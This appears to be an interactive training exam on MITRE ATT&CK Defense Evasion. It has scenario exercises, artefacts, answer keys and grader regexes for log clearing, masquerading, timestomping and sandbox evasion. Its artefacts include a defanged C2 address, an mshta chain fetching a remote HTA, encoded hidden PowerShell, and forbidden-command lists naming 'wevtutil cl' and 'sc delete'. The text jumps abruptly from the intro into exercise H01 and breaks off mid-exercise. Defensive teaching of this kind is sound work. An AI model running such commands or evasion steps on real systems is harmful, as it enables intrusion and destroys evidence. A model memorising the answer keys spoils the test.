<h1>TA0005 &mdash; Defense Evasion &middot; <span class="badge sev-hard">&#9670; HARD</span></h1>
<div class="panel kwpanel">
  <h2>Keywords covered in this exam</h2>
  <p class="dim">These are the ideas behind the ATT&amp;CK object <strong>TA0005 &mdash; Defense Evasion</strong>. They are grouped by theme. Every exercise below comes from this list.</p>
  <div class="themes">
    <div class="theme"><b>Adversary objective &amp; lifecycle</b> Avoid detection while the attack proceeds; TA0005 interlocks with Persistence, PrivEsc, Credential Access and Impact.</div>
    <div class="theme"><b>Log &amp; artifact tampering</b> T1070.001/004/006 (clear logs, delete files, timestomp), events 1102/104, $FILE_NAME vs $STANDARD_INFORMATION mismatches.</div>
    <div class="theme"><b>Defense impairment</b> T1562.001/002/004/007 (tools, event logging, firewall, cloud logs), T1112, tamper alerts, sensor health.</div>
    <div class="theme"><b>Masquerading &amp; hiding</b> T1036.005/006/007 (name/location, space after filename, double extension), T1564.001/002/004 (hidden files, users, ADS), T1036.004.</div>
    <div class="theme"><b>Obfuscation &amp; trusted tools</b> T1027 (incl. command obfuscation, HTML smuggling T1027.006), T1140, T1218 (mshta, rundll32), T1202.</div>
    <div class="theme"><b>Injection &amp; execution flow</b> T1055.001 vs T1055.012 (DLL injection vs hollowing), T1574.001 DLL search-order hijacking, T1574.002 side-loading, T1620.</div>
    <div class="theme"><b>Environment &amp; auth evasion</b> T1497.001/002/003 (system, user-activity, time-based checks), T1550.002/003 (PtH, PtT), RC4 ticket encryption.</div>
    <div class="theme"><b>Telemetry &amp; analytics</b> Sysmon EID 1/7/8/10/11/13/15/23, Windows 1102/4624/4768/4769/7045, parent&ndash;child analytics, signature-vs-path analytics, tuning, false positives.</div>
    <div class="theme"><b>Mitigations &amp; controls</b> M1049 tamper protection, M1038 execution prevention, M1045 code signing, M1044 restrict library loading, M1047 audit, M1026/M1022 least privilege.</div>
    <div class="theme"><b>Real-world procedures</b> Documented behaviors from APT28 log clearing, Trickbot/Emotet AV tampering, LockBit wevtutil cleanup, Lazarus hollowing, FIN7 masquerading.</div>
  </div>
</div>

<div class="panel">
  <h2>Learn first: what is TA0005 &mdash; Defense Evasion?</h2>
  <p>TA0005 is a <strong>Tactic</strong> in the MITRE ATT&amp;CK framework. ATT&amp;CK is a big, free knowledge base that describes what real attackers do. In ATT&amp;CK, a <em>Tactic</em> is a goal. It is the thing an attacker wants to reach at one stage of an attack. Defense Evasion is the goal of <strong>not being noticed</strong>.</p>
  <p>Imagine you are an attacker. You worked hard to get into one computer. If an alarm goes off, you lose everything. So you hide. You delete the files you used. You clean the event logs. You switch off the antivirus. You give your malware a boring name like <em>svchost.exe</em>. All of these moves have one goal: stay invisible. ATT&amp;CK collects these known moves under TA0005 and gives each one an ID, like T1070.001 for clearing logs.</p>
  <p><strong>Where you will meet this at work.</strong> A SOC analyst triages alerts about tampering. An incident responder looks for cleared logs during an investigation. A threat hunter searches for hidden files and fake names. A threat-intel analyst writes reports that name TA0005 techniques. A detection engineer builds alerts for tamper events. A red teamer uses the same map to show defenders what is possible. The tools are your SIEM, your EDR, Sysmon logs and the ATT&amp;CK website. The work products are detection rules, incident tickets and ATT&amp;CK coverage maps. The risk this tactic addresses is simple: if the attacker stays hidden, the attack grows.</p>
</div>

  <ul>
    <li><strong>16 exercises. One severity: HARD.</strong> Exercises chain two or three concepts, use realistic artifacts (2&ndash;4 per exercise), and contain near-miss answers that are defensible in another context. You need <strong>70%</strong> to pass.</li>

PID 6640  Image: C:\\Users\\Public\\svchost.exe        Signed: unsigned   Parent: explorer.exe (double-click)</pre></div></div>
<div class="art"><div class="art-l">ARTEFACT 2 &mdash; memory agent summary (same window)</div><div class="art-b"><pre class="code">PID 2210: normal module list, no private RWX regions, no cross-process writes.
PID 6640: separate on-disk binary; no injection artifacts observed yet; C2 call to hxxp://185[.]62[.]108[.]12:443</pre></div></div>
   <p>Ticket #4471 claims &ldquo;process hollowing on WS-88&rdquo; because the analyst saw &ldquo;two svchost.exe processes&rdquo;. The EDR memory agent shows the second binary is a real file on disk, and no cross-process write or RWX region exists on either PID.</p>`,
   question:"Based on the evidence, which technique is actually present?",
   hint:"Hollowing leaves injection artifacts. Here the artifacts are absent and the binary is on disk. Ask what else explains a fake name.",
   ix:{opts:[
      {id:"o1", h:"Masquerading (T1036) &mdash; a fake name and path"},
      {id:"o2", h:"Process Hollowing (T1055.012) &mdash; a memory swap"},
      {id:"o3", h:"DLL Search Order Hijacking (T1574.001) &mdash; a planted DLL"},
      {id:"o4", h:"Rootkit (T1014) &mdash; kernel-level hiding"}],
     correct:["o1"]},
   explain:"<p>The obvious reading &mdash; two svchost means hollowing &mdash; is wrong here, and the evidence says so: hollowing (T1055.012) injects code into a <em>legitimate</em> process&rsquo;s memory and leaves RWX regions or cross-process writes; both artifacts are absent, and PID 6640 is an ordinary file on disk. What remains is the costume: a binary named after a Windows host process in a user-writable folder &mdash; Masquerading via Match Legitimate Name or Location (T1036.005). DLL search-order hijacking needs a DLL loaded from a planted path (none here), and a rootkit hides at kernel level, which a user-session binary cannot do. Defenders: the signature-vs-path check (signed name, unsigned file, wrong folder) is the analytic that catches this in seconds.</p>",
   study:"T1036.005 versus T1055.012, and the memory evidence that separates them."},

  {id:"H02", kind:"order",
   summary:"Active attacker &mdash; responder order on FS-01",
   scenario:`<p>An attacker on file server FS-01 just disabled the antivirus and cleared one event log. The IR lead hands you the response menu and says: &ldquo;order it. One wrong step destroys evidence or leaves us blind.&rdquo;</p>`,
   question:"Order the five response steps from first to last.",
   hint:"Volatile data dies first, and the log can be cleared again &mdash; both before any repair work.",
   ix:{items:[
      {id:"i1", h:"Capture volatile data (process list, network state) from the live host"},
      {id:"i2", h:"Export the affected event logs to off-host storage before they rotate or get cleared again"},
      {id:"i3", h:"Restore the impaired defense (re-enable AV) and block the actor's access path"},
      {id:"i4", h:"Hunt for persistence, since the tampering implies an established foothold"},
      {id:"i5", h:"Write the report with ATT&CK technique IDs and detection gaps"}]},
   explain:"<p>Order: volatile capture &rarr; log export &rarr; restore defenses &rarr; persistence hunt &rarr; report. Volatile memory dies on reboot, so it is step one. The attacker already demonstrated log clearing (T1070.001), so the remaining logs may be wiped any minute &mdash; export them <em>before</em> re-enabling anything that could spook the actor into full cleanup (including Clear Persistence, T1070.009). Only then restore the impaired tool (T1562.001 remediation), then hunt persistence, then report. Re-enabling first is the classic mistake: it changes the environment while evidence is still moving.</p>",
   study:"evidence-first ordering when T1562.001 and T1070.001 co-occur."},

  {id:"H03", kind:"term", slot:3,
   summary:"DC-02 &mdash; prove who cleared the log",
   scenario:`<p>03:14 on DC-02: the Security log was cleared. The IR lead needs the proving event with the responsible account, <strong>read from the live domain controller</strong>. Rules of engagement: change nothing, destroy nothing, keep the query narrow and the output text-only. You have an elevated shell on the DC.</p>`,
   question:"Type the command that reads only the log-clearing event (Event ID 1102) from the Security log without modifying anything.",
   hint:"Both common log tools can read; neither needs write access. The filter must match on event ID 1102.",
   ix:{prompt:"PS C:\\Users\\ir-lead>",
     canon:"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} -MaxEvents 5 | Format-List",
     elems:[{re:/get-winevent|^wevtutil\s+(qe|epl)/, h:"a read-only log tool (Get-WinEvent or wevtutil qe/epl)"},
            {re:/security/, h:"the Security log named as the source"},
            {re:/1102/, h:"the 1102 filter &mdash; the log-clearing event itself"}],
     forbidden:[{re:/\bcl\b|clear-eventlog|wevtutil cl/, h:"cl / Clear-EventLog wipes the log &mdash; evidence destroyed"},
                {re:/del\b|remove-item/, h:"a delete action on a domain controller during triage"}],
     out:["TimeCreated  : 2026-10-02 03:14:02","Id           : 1102","ProviderName : Microsoft-Windows-Eventlog","Message      : The audit log was cleared.","SubjectUserName: adm_rkeller  SubjectDomainName: CORP"]},
   explain:"<p>Canonical: <code>Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} -MaxEvents 5 | Format-List</code> &mdash; read-only, narrow, and it surfaces the account (<code>SubjectUserName</code>) that cleared the log, which is the whole point. <code>wevtutil qe Security /q:\"*[System[(EventID=1102)]]\" /f:text</code> is the equally valid wevtutil route and scores the same elements. What fails the exercise is any <code>cl</code>/Clear-EventLog: on a live DC that single keystroke destroys the primary evidence of the entire incident &mdash; the exact destruction the attacker started at 03:14. Senior habit: prove the wipe from a second copy (forwarded logs) and never fight the attacker over the only copy.</p>",
   study:"read-only event queries on live DCs, and why cl is forbidden in triage."},

  {id:"H04", kind:"qcm",
   summary:"Alert #8102 &mdash; protection disabled on a build server",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; Defender event 5007, host BLD-03</div><div class="art-b"><pre class="code">2026-10-03 10:02:11  Real-time protection changed: Off   by CORP\\img_build_svc</pre></div></div>
<div class="art"><div class="art-l">ARTEFACT 2 &mdash; change calendar</div><div class="art-b"><pre class="code">CHG-2214 (approved)  10:00-12:00  Gold-image rebuild on BLD-03
Owner: img_build_svc  (service account, documented for image builds)</pre></div></div>
<div class="art"><div class="art-l">ARTEFACT 3 &mdash; context</div><div class="art-b"><pre class="code">Source host: BLD-03 console session (expected for image builds)
No other hosts affected. No logon anomalies for the account this week.</pre></div></div>`,
   question:"Alert #8102 fires. What is the correct first move?",
   hint:"Everything matches an approved change. Pick the least aggressive action that still closes the loop.",
   ix:{opts:[
      {id:"o1", h:"Correlate with CHG-2214 and annotate the alert as expected activity"},
      {id:"o2", h:"Isolate BLD-03 from the network immediately"},
      {id:"o3", h:"Silently re-enable real-time protection without telling the build owner"},
      {id:"o4", h:"Disable the img_build_svc account pending investigation"}],
     correct:["o1"]},
   explain:"<p>This is the &ldquo;looks alarming, is benign&rdquo; case: an approved change (CHG-2214), the documented service account, the expected console session, one host, business hours. Isolation would abort a build and cost the image team a day; silently re-enabling mid-build breaks the image pipeline; disabling the account is punitive before the correlation is even done. The correct, least-aggressive move is correlation + annotation with the change window &mdash; and it is also the move that keeps alert fatigue down so the <em>real</em> tamper alert, at 02:00 with no ticket, still gets a fresh look. Benign-by-ticket is a decision, not an assumption: the ticket, account, host and time all matched.</p>",
   study:"correlating tamper alerts with change management before escalating."},

  {id:"H05", kind:"multi",
   summary:"Coverage review &mdash; two blind spots",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; current TA0005 detections (detection engineer's board)</div><div class="art-b"><pre class="code">COVERED: T1070.001 (event 1102 alert)          COVERED: T1562.001 (Defender 5007 alert)
COVERED: T1218.005 (mshta network-child alert)  GAP?: the rest of the tactic
Priority: cloud-facing servers + domain controllers</pre></div></div>`,
   question:"Select the TWO techniques that remain UNCOVERED and matter most for cloud-facing servers, given the board above.",
   hint:"Two candidates are already on the covered list. One gap touches cloud audit trails, the other touches file metadata.",
   ix:{opts:[
      {id:"o1", h:"Disable Cloud Logs (T1562.007) &mdash; no analytic watches audit-trail changes"},
      {id:"o2", h:"Timestomp (T1070.006) &mdash; no file-metadata mismatch analytic exists"},
      {id:"o3", h:"Clear Windows Event Logs (T1070.001) &mdash; already has the 1102 alert"},
      {id:"o4", h:"Disable or Modify Tools (T1562.001) &mdash; already has the 5007 alert"},
      {id:"o5", h:"Mshta (T1218.005) &mdash; already has the network-child alert"}],
     correct:["o1","o2"]},
   explain:"<p>The board shows three covered techniques; the exercise asks for what is <em>missing</em>. Disable Cloud Logs (T1562.007) is the priority gap for cloud-facing servers: an attacker with enough rights can turn off audit trails at the provider level, and none of your host analytics would notice. Timestomp (T1070.006) needs a file-metadata analytic (created-vs-modified mismatches) that nobody has built yet. The other three options are distractors precisely because they are the covered ones &mdash; a common review-meeting trap is re-litigating what already works instead of funding the gaps.</p>",
   study:"coverage-gap analysis against the TA0005 technique list."},

  {id:"H06", kind:"multi",
   summary:"Malware lab &mdash; the picky dropper",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; dropper pseudo-code (sandbox trace, LAB-SAND-2)</div><div class="art-b"><pre class="code">if (cpu_cores < 2)              exit(0)
if (total_ram  < 4 GB)          exit(0)
if (uptime      < 10 minutes)   exit(0)
Sleep(20 * 60 * 1000)                      // 20 minutes
if (no mouse move in last 15 min) exit(0)
if (document_count("C:\\Users\\") < 5) exit(0)
drop_stage2()</pre></div></div>`,
   question:"Select the THREE Defense Evasion techniques this dropper uses.",
   hint:"Sort the checks by what they measure: the machine itself, the passage of time, the human using it.",
   ix:{opts:[
      {id:"o1", h:"System Checks (T1497.001) &mdash; cores, RAM, uptime"},
      {id:"o2", h:"Time Based Evasion (T1497.003) &mdash; the 20-minute sleep"},
      {id:"o3", h:"User Activity Based Checks (T1497.002) &mdash; mouse movement, documents"},
      {id:"o4", h:"Virtualization/Sandbox Evasion parent (T1497) only, with no sub-techniques"},
      {id:"o5", h:"Obfuscated Files or Information (T1027) &mdash; the exit calls"}],
     correct:["o1","o2","o3"]},
   explain:"<p>Every <code>if</code> is a sandbox tripwire. Cores, RAM and uptime are environment properties &mdash; System Checks (T1497.001). The 20-minute sleep outlasts typical automated analysis windows &mdash; Time Based Evasion (T1497.003). Mouse movement and user documents test for a real human &mdash; User Activity Based Checks (T1497.002). The parent technique T1497 is the umbrella, not a third separate choice, and nothing in this code transforms or hides content, so T1027 does not apply. Detection angle: fileless droppers like this are best caught at the <em>drop</em> of stage 2, hours after execution &mdash; keep sandbox detonation windows long enough to matter.</p>",
   study:"T1497 sub-techniques and long-window detonation."},

  {id:"H07", kind:"qcm",
   summary:"DC-02 &mdash; a ticket that should not exist",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; Kerberos events, DC-02, 02:51</div><div class="art-b"><pre class="code">4768  TGT requested  User: CORP\\svc_backup  Encryption: 0x17 (RC4-HMAC)
4624  LogonType 3 (network)  Auth: Kerberos  Workstation: WKS-19
Note: svc_backup normally authenticates from SRV-BK01 only.
Note: WKS-19 has never held an interactive session for this account.
Note: no NTLM events anywhere in the same window.</pre></div></div>`,
   question:"Which technique best explains this evidence?",
   hint:"The account moved hosts without any password authentication, and the traffic is Kerberos with an old encryption type. Reused what?",
   ix:{opts:[
      {id:"o1", h:"Pass the Ticket (T1550.003)"},
      {id:"o2", h:"Pass the Hash (T1550.002)"},
      {id:"o3", h:"Downgrade Attack (T1562.010)"},
      {id:"o4", h:"Modify Authentication Process (T1556)"}],
     correct:["o1"]},
   explain:"<p>The evidence pattern: a Kerberos TGT appears on a host that never saw the password. That is a <em>reused ticket</em> &mdash; Pass the Ticket (T1550.003): the attacker exported the .kirbi ticket from SRV-BK01 and injected it on WKS-19, so Kerberos does the authentication with no password involved. Pass the Hash is the NTLM sibling &mdash; but the artefact shows no NTLM anywhere, which kills that reading. Downgrade Attack (T1562.010) is the nearest miss: RC4 (0x17) <em>is</em> a weak, older encryption type, but nothing here was forced to downgrade &mdash; the RC4 usage rides on the stolen ticket&rsquo;s type; the technique goal is reuse of auth material, not protocol weakening. T1556 would mean tampering with the authentication process itself (e.g., an SSP), for which there is no host evidence.</p>",
   study:"T1550.003 versus T1550.002, and reading ticket encryption types."},

  {id:"H08", kind:"dnd",
   summary:"Matrix placement &mdash; six techniques, five columns",
   scenario:`<p>Quarterly CTI review: six techniques from the quarter's incidents need placing on a mini matrix excerpt. Some columns are not TA0005 &mdash; the point is to place each technique by its <em>goal</em>.</p>`,
   question:"Place all six technique cards into the correct tactic column.",
   hint:"Clearing timestamps and double extensions serve hiding. Dumping LSASS serves credential theft. PowerShell execution serves running code.",
   ix:{zones:[
      {id:"z1", h:"Initial Access"},
      {id:"z2", h:"Execution"},
      {id:"z3", h:"Credential Access"},
      {id:"z4", h:"Defense Evasion (TA0005)"},
      {id:"z5", h:"Impact"}],
     items:[
      {id:"i1", h:"Spearphishing Attachment (T1566.001)", z:"z1"},
      {id:"i2", h:"PowerShell (T1059.001)", z:"z2"},
      {id:"i3", h:"LSASS Memory dumping (T1003.001)", z:"z3"},
      {id:"i4", h:"Timestomp (T1070.006)", z:"z4"},
      {id:"i5", h:"Double File Extension (T1036.007)", z:"z4"},
      {id:"i6", h:"Data Encrypted for Impact (T1486)", z:"z5"}]},
   explain:"<p>Goal-based placement: phishing gets you in (TA0001); PowerShell runs code (TA0002); LSASS dumping steals credentials (TA0006); timestomping and double extensions both exist to avoid notice (TA0005 &mdash; T1070.006 and T1036.007); ransomware encryption damages (TA0040). Two cards landing in the same column is normal &mdash; TA0005 is one of the most populated tactics precisely because every other phase needs some concealment to survive.</p>",
   study:"goal-based matrix placement across neighboring tactics."},

  {id:"H09", kind:"qcm",
   summary:"Rule review &mdash; the svchost alert storm",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; draft SIEM rule, PR-118</div><div class="art-b"><pre class="code">rule "svchost_execution" {
  when process.name == "svchost.exe"  ->  alert severity=critical
}
Two-week backtest: 1,284,902 events matched. (True attacks in window: 1.)</pre></div></div>`,
   question:"What is the core flaw of this draft rule?",
   hint:"Ask what the rule would do to the team at 08:00 on a Monday. Then ask what actually distinguishes the fake svchost.",
   ix:{opts:[
      {id:"o1", h:"It alerts on normal svchost activity &mdash; it must scope on path, signature and parent instead"},
      {id:"o2", h:"svchost.exe should never spawn from services.exe, so the rule misses the anomaly"},
      {id:"o3", h:"The rule needs a higher severity level to be useful"},
      {id:"o4", h:"svchost.exe cannot be abused, so the rule watches nothing real"}],
     correct:["o1"]},
   explain:"<p>svchost.exe legitimately runs constantly &mdash; the backtest proves the rule is noise, and noise is how real alerts die in a queue. The fix is scoping on what made the fake instance special in ticket #4471: <em>path</em> (not System32), <em>signature</em> (unsigned despite the Windows name), <em>parent</em> (explorer.exe instead of services.exe). Option 2 inverts reality &mdash; svchost <em>does</em> legitimately spawn from services.exe. Severity and usefulness of the concept (option 4) are red herrings: the technique is absolutely real, the rule is just pointed at the wrong signal. Detection engineering 101 for TA0005: name-looks-normal techniques are detected by <em>context mismatch</em>, never by name alone.</p>",
   study:"context-mismatch analytics for masquerading techniques."},

  {id:"H10", kind:"dnd",
   summary:"Near-miss pairs &mdash; which is which",
   scenario:`<p>Your mentee keeps swapping these look-alike techniques in reports. Build the corrective card: match each description to the technique it actually names.</p>`,
   question:"Drag each description onto the technique it defines.",
   hint:"The pairs differ by object: filename characters, process memory, attribute vs stream, and where a user account is hidden.",
   ix:{zones:[
      {id:"z1", h:"Double File Extension (T1036.007)"},
      {id:"z2", h:"Space after Filename (T1036.006)"},
      {id:"z3", h:"Process Hollowing (T1055.012)"},
      {id:"z4", h:"NTFS File Attributes (T1564.004)"},
      {id:"z5", h:"Hidden Users (T1564.002)"}],
     items:[
      {id:"i1", h:"invoice.pdf.exe &mdash; a second extension behind the innocent one", z:"z1"},
      {id:"i2", h:"invoice.pdf &mdash; trailing whitespace hides the real extension in some views", z:"z2"},
      {id:"i3", h:"Legitimate process started, its memory swapped for attacker code", z:"z3"},
      {id:"i4", h:"Payload stored in an NTFS alternate data stream like file.txt:evil.exe", z:"z4"},
      {id:"i5", h:"Registry-level user accounts hidden from the Windows logon screen", z:"z5"}]},
   explain:"<p>Both filename tricks are Masquerading, but they differ in the trick: T1036.007 adds a fake extension behind the real one; T1036.006 adds trailing whitespace so Windows&rsquo; default view shows only &ldquo;invoice.pdf&rdquo;. Hollowing (T1055.012) <em>replaces</em> a legitimate process&rsquo;s memory; plain DLL Injection (T1055.001) would <em>add</em> a library instead &mdash; the mentee&rsquo;s usual swap. T1564.004 abuses NTFS extended attributes/streams to store data where Explorer shows nothing; T1564.002 hides <em>accounts</em> via registry keys so they never appear on the logon screen. Precise technique naming keeps your ATT&amp;CK heat map and your detections aligned.</p>",
   study:"the near-miss pairs inside T1036, T1055 and T1564."},

  {id:"H11", kind:"term", slot:11,
   summary:"Containment call &mdash; stop it, keep the evidence",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; triage note, host FS-01</div><div class="art-b"><pre class="code">Fake service:  WinDefendSvc  (NOT the real WinDefend)
Binary:        C:\\Users\\Public\\svchost.exe  (confirmed malicious, masquerading)
Running now:   yes, PID 6640
IR lead order: "Stop the process NOW. Its registration and files stay
                intact for forensics. Touch the REAL Defender nothing."</pre></div></div>`,
   question:"Type the command that stops the fake service while preserving its registration and files.",
   hint:"Stopping is reversible and non-destructive. Removing or killing by image name both cross the line.",
   ix:{prompt:"PS C:\\Users\\ir-lead>",
     canon:"sc stop WinDefendSvc",
     elems:[{re:/^(sc|net)\s|stop-service/, h:"the service-control tool (sc, net, or Stop-Service)"},
            {re:/\bstop\b/, h:"stop &mdash; halts the running service, registration stays"},
            {re:/windefendsvc/, h:"WinDefendSvc &mdash; the exact fake service name"}],
     forbidden:[{re:/\bdelete\b/, h:"sc delete removes the registration &mdash; destroys forensic value"},
                {re:/windefend(?!svc)/, h:"that targets the REAL WinDefend service &mdash; the attacker wins"},
                {re:/taskkill|stop-process/, h:"killing by PID/image bypasses the service and sheds logged context"}],
     out:["SERVICE_NAME: WinDefendSvc","        TYPE               : 10  WIN32_OWN_PROCESS","        STATE              : 3  STOP_PENDING","        (STOPPABLE)"]},
   explain:"<p>Canonical: <code>sc stop WinDefendSvc</code>. Stopping halts the malicious process while leaving the service registration and binary on disk &mdash; exactly what the IR order demanded, because registration keys, ImagePath and the file itself are all evidence of the masquerade. <code>sc delete</code> would erase that registration (evidence gone). <code>net stop WinDefend</code> or anything matching the real Defender name would take down your own antivirus &mdash; the attacker&rsquo;s T1562.001 goal completed by the responder. <code>taskkill</code> works mechanically but loses the service-context logging the IR team wants. The near-misses here are all defensible-looking; only <em>stop the named fake service</em> satisfies both goals: containment now, evidence intact.</p>",
   study:"least-destructive containment and protecting service-registration evidence."},

  {id:"H12", kind:"qcm",
   summary:"MFT review &mdash; the impossible file",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; NTFS metadata, C:\\Windows\\Temp\\winupdate.exe</div><div class="art-b"><pre class="code">$STANDARD_INFORMATION   Created:  2024-03-01 09:12   Modified: 2020-01-01 00:00
$FILE_NAME              Created:  2026-10-04 02:41   Modified: 2026-10-04 02:44
AV verdict: clean (signature expired, but hash unknown on VT)</pre></div></div>`,
   question:"Which technique does this metadata pattern indicate, and which clue clinches it?",
   hint:"Compare the two timestamp sets Windows keeps. One of them can be edited with tools; the other one usually is not.",
   ix:{opts:[
      {id:"o1", h:"Timestomp (T1070.006) &mdash; $STANDARD_INFORMATION modified before created"},
      {id:"o2", h:"Obfuscated Files or Information (T1027) &mdash; the two timestamp sets differ"},
      {id:"o3", h:"NTFS File Attributes (T1564.004) &mdash; the file sits in Temp"},
      {id:"o4", h:"Hidden Files and Directories (T1564.001) &mdash; the H attribute is set"}],
     correct:["o1"]},
   explain:"<p>NTFS keeps two timestamp sets: $STANDARD_INFORMATION (what Explorer and most tools show, and what timestomping tools edit) and $FILE_NAME (maintained by the filesystem itself, rarely touched). Here the tool-edited set claims a 2020 modification for a file created in 2024 &mdash; modified-before-created is naturally impossible &mdash; while $FILE_NAME still tells the truth: written at 02:44 today. That clinches Timestomp (T1070.006), an Indicator Removal sub-technique. The two timestamp sets <em>always</em> differ slightly, so differing sets alone do not mean T1027. Temp placement and hidden attributes are unrelated to what the artefact actually shows. Responders love this analytic because timestomping tools rarely bother to forge $FILE_NAME.</p>",
   study:"dual timestamp sets and the T1070.006 detection analytic."},

  {id:"H13", kind:"multi",
   summary:"Quiet service &mdash; select every true statement",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; event 7045, host WS-31, 02:47</div><div class="art-b"><pre class="code">Service name:  ChromeUpdaterSvc
Binary:        C:\\Windows\\System32\\cmd.exe /c powershell.exe -nop -w hidden -enc SQBFAFgA...
Account:       LocalSystem
No related tickets. Google Chrome is installed on WS-31.</pre></div></div>`,
   question:"Select ALL statements that are TRUE for this artifact (three of five).",
   hint:"Judge each statement on the artifact alone. The timestamp alone proves nothing; cmd.exe itself is not evil.",
   ix:{opts:[
      {id:"o1", h:"The encoded PowerShell argument indicates Obfuscated Files or Information (T1027)"},
      {id:"o2", h:"Launching through cmd.exe from a service binary path points to Indirect Command Execution (T1202)"},
      {id:"o3", h:"The service name mimics a legitimate updater, fitting Masquerade Task or Service (T1036.004)"},
      {id:"o4", h:"The 02:47 timestamp alone proves malicious intent"},
      {id:"o5", h:"cmd.exe is never legitimately used by services, so the host is compromised"}],
     correct:["o1","o2","o3"]},
   explain:"<p>True 1: the <code>-enc</code> blob is command obfuscation &mdash; the payload hides its content from casual reading (T1027). True 2: a service binary pointing at <code>cmd.exe /c powershell.exe</code> chains execution through intermediaries &mdash; Indirect Command Execution (T1202). True 3: &ldquo;ChromeUpdaterSvc&rdquo; on a Chrome-installed host is exactly the Masquerade Task or Service trick (T1036.004) &mdash; plausible name, hostile payload. False 4: 02:47 is suspicious context, never proof &mdash; servers run scheduled work at night. False 5: cmd.exe in service definitions happens legitimately; the hostile parts here are the encoding, the hidden window and the fake name, not cmd itself. The service-creation event itself (7045) is also your persistence-detection anchor, since a masqueraded service usually double-books as persistence.</p>",
   study:"reading composite artifacts: masquerade + obfuscation + indirect execution."},

  {id:"H14", kind:"fill",
   summary:"Analytic tuning &mdash; 1102 with context",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; draft analytic, DET-TA0005-002</div><div class="art-b"><pre class="code">index=win EventCode=1102
  -> alert "Security log cleared"
Backtest: 41 hits in 30 days. 40 are the nightly backup job
(SVC_BACKUP clears its local forwarder log by design).</pre></div></div>`,
   question:"Fill all three blanks to finish the tuned analytic.",
   hint:"Blank 1 filters WHO cleared. Blank 2 is the list that keeps known-good accounts quiet. Blank 3 is the command the attacker most likely ran.",
   ix:{segs:[
      "Alert only when the clearing account ",
      " is not on the ",
      " (the nightly SVC_BACKUP stays quiet). Enrich the alert with the process that ran ",
      "."],
     slots:["account","allowlist","wevtutil"],
     slotNames:["the actor field","the known-good list","the clearing command"],
     bank:["account","hostname","allowlist","blacklist","wevtutil","certutil","104","1102"]},
   explain:"<p>Raw 1102 alerts drown in the backup job&rsquo;s nightly clear. The tuned analytic compares the <em>account</em> that cleared the log against an <em>allowlist</em> of documented clearers (SVC_BACKUP) &mdash; anything else pages the team. The enrichment pulls the process that ran <code>wevtutil</code> (or Clear-EventLog) from process telemetry, giving responders parent, path and user in one view. Blacklist-first thinking (wrong option) fails on day one: you cannot enumerate every attacker account. And note the near-miss options 104 and 1102: both are log-clear events, but the draft rule already keys on 1102 &mdash; the blanks needed the actor, the list and the tool.</p>",
   study:"tuning high-value evasion analytics with allowlists and enrichment."},

  {id:"H15", kind:"branch",
   summary:"Ransomware precursor &mdash; decisions with cost",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; FS-01 (payments file server), 03:00&ndash;03:40</div><div class="art-b"><pre class="code">03:00  Defender real-time protection OFF (event 5007, account adm_rkeller)
03:14  Security log cleared (event 1102, same account)
03:22  New service "OneDriveSyncSvc" -> C:\\Users\\Public\\svhost.exe (event 7045)
03:40  Large SMB reads from FS-01 to a single external host
Context: FS-01 serves the payments share. Business hours start 07:00.</pre></div></div>`,
   question:"Work through the three decision steps.",
   hint:"Step 1: what dies first if you reboot? Step 2: containment has a cheap option and an expensive one. Step 3: what does the attacker expect you to do?",
   ix:{steps:[
      {q:"03:45. The IR lead asks for the immediate priority. Which one?",
       opts:[{id:"o1", h:"Preserve volatile evidence and export the remaining logs before anything else"},
             {id:"o2", h:"Reboot FS-01 to flush the attacker from memory"},
             {id:"o3", h:"Wait for the full IR team at 07:00 to avoid a false alarm"}],
       correct:"o1"},
      {q:"The CISO demands containment with minimal payments downtime. Which move fits?",
       opts:[{id:"o4", h:"Targeted containment: block the C2 flow, disable adm_rkeller, keep FS-01 serving shares"},
             {id:"o5", h:"Full network isolation of FS-01 immediately, payments down"},
             {id:"o6", h:"No containment yet &mdash; monitor and collect more evidence"}],
       correct:"o4"},
      {q:"Containment is in place at 04:10. What must you explicitly NOT do next?",
       opts:[{id:"o7", h:"Declare the incident closed after re-enabling Defender and removing the fake service"},
             {id:"o8", h:"Hunt for the persistence mechanism and other compromised accounts"},
             {id:"o9", h:"Brief legal and management on possible data exposure"}],
       correct:"o7"}]},
   explain:"<p>Step 1: rebooting destroys memory evidence (the T1055-style tooling in svhost.exe lives in RAM) &mdash; volatile capture and log export come first; the attacker already cleared one log, so assume more cleanup is coming. Step 2: the SMB exfil suggests data is leaving, but payments shares keep the business alive &mdash; targeted containment (block C2, kill the compromised admin account, keep shares up) buys safety at near-zero downtime; full isolation is the fallback if targeted steps fail, and &ldquo;monitor only&rdquo; ignores active exfiltration. Step 3: this chain &mdash; T1562.001, T1070.001, masqueraded service persistence &mdash; is a textbook ransomware precursor; re-enabling Defender while the actor still holds persistence just re-runs their playbook. The 03:22 fake service and the 03:00 account both demand deeper scoping first.</p>",
   study:"sequencing response when evasion, persistence and exfiltration coexist."},

  {id:"H16", kind:"dnd",
   summary:"Dual perspective &mdash; the mshta chain",
   scenario:`<div class="art"><div class="art-l">ARTEFACT 1 &mdash; confirmed chain, WS-88</div><div class="art-b"><pre class="code">outlook.exe -> mshta.exe hxxp://185[.]62[.]108[.]12/app.hta -> powershell -enc ... -> payload.dll (unsigned)</pre></div></div>
   <p>The blue team lead pins this chain on the board and splits it into two columns: what the <strong>attacker (red)</strong> does next to stay hidden, and what the <strong>defender (blue)</strong> detects or blocks. Sort the four cards.</p>`,
   question:"Drag each card to the perspective it belongs to.",
   hint:"Cards about next evasion moves are red. Cards about telemetry and blocking are blue.",
   ix:{zones:[
      {id:"z1", h:"RED &mdash; attacker's next move"},
      {id:"z2", h:"BLUE &mdash; defender's counter"}],
     items:[
      {id:"i1", h:"Alert on mshta.exe spawning PowerShell with an encoded command", z:"z2"},
      {id:"i2", h:"Embed the next payload in an HTML attachment so the browser drops it silently (HTML Smuggling, T1027.006)", z:"z1"},
